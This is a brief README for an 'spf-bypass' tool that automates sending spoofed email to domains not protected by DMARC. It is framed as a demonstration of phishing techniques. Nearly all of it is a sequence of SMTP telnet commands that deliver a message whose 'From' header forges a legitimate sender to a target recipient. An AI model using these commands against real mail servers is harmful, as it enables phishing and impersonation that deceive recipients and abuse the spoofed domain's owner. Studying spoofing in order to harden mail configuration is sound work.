# spf-bypass
PLEASE NOTE THIS PROJECT WILL BE SUBJECT TO FREQUENT CHANGES

This project automates and demonstrates SPF-bypass techniques utilised by phishers to abuse domains that haven't been secured by DMARC.

The executable itself simply provides an interactive console for implementing the below telnet commands that can be executed on any Windows or Linux machine.

    telnet target.mailserver.com 25

    helo attackerdomain.com

    mail from: attacker@attackerdomain.com

    rcpt to: target@target.com.au

    data

    from: "Sender, Legitimate" <Legitimate_Sender@spoofed.com>

    to: target@target.com.au

    subject: Presentation - Email Demo

    This is a test

    .
